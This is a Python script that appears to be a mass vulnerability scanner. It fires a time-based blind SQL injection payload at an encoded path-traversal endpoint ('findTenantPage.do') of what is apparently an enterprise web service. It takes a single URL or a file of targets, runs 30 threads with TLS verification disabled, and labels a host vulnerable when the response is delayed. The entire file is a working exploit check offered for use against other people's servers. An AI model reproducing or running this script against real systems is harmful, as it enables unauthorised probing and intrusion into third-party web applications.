import requests
import argparse
import time
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    banner = """
       _________    _____   ____  _______  __ ___________ 
      / ___\__  \  /     \_/ __ \/  _ \  \/ // __ \_  __ \
     / /_/  > __ \|  Y Y  \  ___(  <_> )   /\  ___/|  | \/
     \___  (____  /__|_|  /\___  >____/ \_/  \___  >__|   
    /_____/     \/      \/     \/                \/                                                                         

    """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    pool = Pool(30)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            check(f"http://{args.url}")
    elif args.file:
        with open(args.file) as f:
            targets = []
            for target in f.readlines():
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    target = f"http://{target}"
                    targets.append(target)
            pool.map(check, targets)

def check(target):
    url = f"{target}//trwfe/service/.%2E/invoker/findTenantPage.do"
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'53',
        'Connection':'close',
    }
    data="""sort=(SELECT 2005 FROM (SELECT(SLEEP(3)))IEWh)"""

    try:
        start_time = time.time()  # 记录请求开始时间
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
        end_time = time.time()  # 记录请求结束时间

        # 计算响应时间（单位：秒）
        response_time = end_time - start_time
        response = requests.post(url, headers=headers, data=data, verify=False)
        if response.status_code == 200 and response_time >= 3  :
            print(f"{target}存在漏洞")
        else:
            print(f"{target}不存在漏洞")
    except Exception as e:
        print(e)
if __name__ == '__main__':
    main()